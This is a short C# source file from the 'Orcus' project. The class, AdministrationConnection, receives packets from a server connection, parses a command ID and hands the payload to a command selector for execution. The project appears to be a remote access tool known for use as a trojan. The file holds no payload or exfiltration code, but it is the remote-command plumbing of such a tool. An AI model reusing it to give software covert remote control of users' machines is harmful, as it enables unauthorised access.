using System;
using Orcus.CommandManagement;
using Orcus.Plugins;
using Orcus.Shared.Communication;

namespace Orcus.Connection
{
    public class AdministrationConnection : IDisposable
    {
        private readonly CommandSelector _commandSelector;
        private readonly ConnectionInfo _connectionInfo;

        public AdministrationConnection(ushort id, ServerConnection connection, IClientInfo clientInfo)
        {
            _commandSelector = new CommandSelector();
            _connectionInfo = new ConnectionInfo(connection, id, clientInfo,
                (IConnectionInitializer) _commandSelector.CommandDictionary[32]);
            _connectionInfo.Failed += ConnectionInfoOnFailed;
            
            Id = id;
        }

        public void Dispose()
        {
            _commandSelector.Dispose();
        }

        public event EventHandler SendFailed;

        public ushort Id { get; }

        public void PackageReceived(byte parameter, byte[] data, int index)
        {
            switch ((SendingType) parameter)
            {
                case SendingType.Command:
                    var finalData = new byte[data.Length - index - 4];
                    Array.Copy(data, index + 4, finalData, 0, finalData.Length);

                    _commandSelector.ExecuteCommand(BitConverter.ToUInt32(data, index), finalData,
                        _connectionInfo);
                    break;
                default:
                    return;
            }
        }

        public void SendPackage(byte[] package, ResponseType responseType)
        {
            _connectionInfo.Response(package, responseType);
        }

        private void ConnectionInfoOnFailed(object sender, EventArgs eventArgs)
        {
            SendFailed?.Invoke(this, EventArgs.Empty);
        }
    }
}